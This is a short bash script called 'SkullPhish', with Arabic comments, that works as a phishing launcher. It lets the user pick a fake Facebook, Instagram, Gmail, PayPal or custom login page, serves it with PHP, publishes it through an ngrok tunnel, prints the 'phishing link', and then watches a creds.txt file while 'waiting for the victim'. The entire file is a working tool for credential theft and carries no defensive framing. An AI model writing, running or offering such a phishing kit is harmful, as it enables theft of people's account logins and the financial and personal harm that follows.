#!/bin/bash

# SkullPhish - Multi phishing tool
# By Skull (عبد الرحمن)

# الألوان
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
clear='\e[0m'

# استيراد ملفات مساعدة
source core/banner.sh
source core/utils.sh

# عرض اللوجو
banner

# قائمة المواقع
function site_menu() {
  echo -e "${blue}اختر موقع فيشنج:"
  echo -e "1) Facebook"
  echo -e "2) Instagram"
  echo -e "3) Gmail"
  echo -e "4) Paypal"
  echo -e "5) Custom Page"
  echo -e "0) خروج${clear}"
  read -p "$(echo -e "${yellow}اختار رقم: ${clear}")" option

  case $option in
    1) start_attack facebook ;;
    2) start_attack instagram ;;
    3) start_attack gmail ;;
    4) start_attack paypal ;;
    5) start_attack custom ;;
    0) echo -e "${red}مع السلامة!${clear}"; exit ;;
    *) echo -e "${red}خيار غير صحيح${clear}"; sleep 1; site_menu ;;
  esac
}

# بدء الهجوم
function start_attack() {
  target=$1
  echo -e "${green}جاري تشغيل صفحة $target...${clear}"

  cd sites/$target || { echo -e "${red}خطأ: مجلد $target غير موجود${clear}"; exit 1; }

  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2

  # تشغيل ngrok (محتاج يكون موجود بنفس المجلد)
  ./../../ngrok http 3333 > /dev/null 2>&1 &
  sleep 7

  link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-zA-Z.]*\.ngrok\.io')
  echo -e "${yellow}رابط فيشنج: ${blue}$link${clear}"

  echo -e "${yellow}في انتظار الضحية...${clear}"
  tail -f creds.txt
}

site_menu
